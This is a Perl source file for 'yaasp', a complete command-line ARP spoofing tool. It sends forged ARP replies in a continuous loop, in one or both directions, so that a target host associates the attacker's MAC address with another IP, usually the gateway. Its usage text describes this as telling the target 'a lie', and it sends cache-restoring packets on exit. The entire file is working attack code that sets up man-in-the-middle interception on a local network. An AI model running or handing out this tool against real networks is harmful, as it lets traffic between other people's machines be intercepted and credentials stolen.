#!/usr/bin/env perl
#===============================================================================
#
#         FILE: arpsperl.pl
#
#        USAGE: ./arpsperl.pl --tell-ip 192.168.1.107 --i-am 192.168.1.1 -i wlan0
#
#  DESCRIPTION:
#
#      OPTIONS: ---
# REQUIREMENTS: ---
#         BUGS: ---
#        NOTES: ---
#       AUTHOR: gnebbia
# ORGANIZATION:
#      VERSION: 1.0
#      CREATED: 08/04/2016 06:59:25 PM
#     REVISION: ---
#===============================================================================

use Modern::Perl;
use Getopt::Long;
use Net::ARP;
use Net::Frame::Device;

use autodie;

use constant NO_CLEANING_PACKETS => 10;

main();

sub main {
    my $net_interface     = "wlan0";
    my $is_bidirectional  = 0;
    my $is_help_requested = 0;
    my $first_target_ip;
    my $second_target_ip;
    my $delay;

    GetOptions(
        'interface|i=s'   => \$net_interface,
        'tell-ip|t=s'     => \$first_target_ip,
        'i-am|m=s'        => \$second_target_ip,
        'bidirectional|b' => \$is_bidirectional,
        'delay|d'         => \$delay,
        'help|h'          => \$is_help_requested,
      )
      or die usage(
        "Error in command-line arguments, please provide correct IP addresses");

    usage() and exit if ($is_help_requested);

    die usage(
        "Error in command-line arguments, please provide correct IP addresses")
      unless ( $first_target_ip and $second_target_ip );

    my $host_net_device = Net::Frame::Device->new( dev => $net_interface )
      or die "Cannot open device $net_interface";

    $SIG{INT} = sub {
        arp_clean(
            $host_net_device,  $first_target_ip, $second_target_ip,
            $is_bidirectional, $delay
        );
    };

    if ( !$is_bidirectional ) {
        while (1) {
            send_arp_packet( $host_net_device, $second_target_ip,
                $first_target_ip, 1 )
              or die "Error while sending packet: $!\n";

            say
"i told $first_target_ip that i am $second_target_ip now he knows my mac "
              . $host_net_device->mac
              . " one way packet sent";
            sleep($delay) if $delay;
        }
    }
    else {
        while (1) {

            # Packet from target 1 to target 2
            send_arp_packet( $host_net_device, $second_target_ip,
                $first_target_ip, 1 )
              or die "Error while sending packet: $!\n";

            # Packet from target 2 to target 1
            send_arp_packet( $host_net_device, $first_target_ip,
                $second_target_ip, 1 )
              or die "Error while sending packet: $!\n";
            sleep($delay) if $delay;
        }
    }
}

sub arp_clean {
    my (
        $host_net_device,  $first_target_ip, $second_target_ip,
        $is_bidirectional, $delay
    ) = @_;
    say "ARP Cache Cleaning...";

    if ( !$is_bidirectional ) {
        for ( 1 .. NO_CLEANING_PACKETS ) {
            send_arp_packet( $host_net_device, $second_target_ip,
                $first_target_ip );
            say "sending cleaning packet...";
            sleep($delay) if $delay;
        }
    }
    else {
        for ( 1 .. NO_CLEANING_PACKETS ) {
            send_arp_packet( $host_net_device, $second_target_ip,
                $first_target_ip );
            say "cleaning packet A->B";
            sleep($delay) if $delay;
        }

        for ( 1 .. NO_CLEANING_PACKETS ) {
            send_arp_packet( $host_net_device, $first_target_ip,
                $second_target_ip );
            say "cleaning packet B->A";
            sleep($delay) if $delay;
        }
    }
    print("ARP Cache Cleaned!\n");
    exit(0);
}

sub send_arp_packet {
    my ( $host_net_device, $first_target_ip, $second_target_ip, $is_spoofing )
      = @_;
    my $first_target_mac =
      Net::ARP::arp_lookup( $host_net_device->dev, $first_target_ip );
    my $second_target_mac =
      Net::ARP::arp_lookup( $host_net_device->dev, $second_target_ip );

    if ($is_spoofing) {
        Net::ARP::send_packet(
            $host_net_device->dev,    # Device
            $first_target_ip,         # Source IP
            $second_target_ip,        # Destination IP
            $host_net_device->mac,    # Source MAC
            $second_target_mac,       # Destinaton MAC
            'reply',
        );
    }
    else {
        Net::ARP::send_packet(
            $host_net_device->dev,    # Device
            $first_target_ip,         # Source IP
            $second_target_ip,        # Destination IP
            $first_target_mac,        # Source MAC
            $second_target_mac,       # Destinaton MAC
            'reply',
        );
    }
}

sub error_arguments {

    print usage();
}

sub usage {
    my ($error_message) = @_;
    say $error_message if $error_message;
    print <<"EOUSAGE";
This is yaasp (Yet Another Arp Spoof Program), a perl script to perform arp spoof. 

Usage Example: $0 --interface <interface_name> --tell-ip <first_target> --i-am <second_target>

Command Line Arguments:

[--interface]	<dev>	specifies the net interface on which 
			to perform arp spoof, default is "wlan0"

[--tell-ip]	<ip> 	specifies the ip address on which we 
			will tell a lie and perform the spoof

[--i-am]	<ip> 	specifies which ip we will fake, often 
			one set this to the gateway

[--help]	show this help

EOUSAGE
}
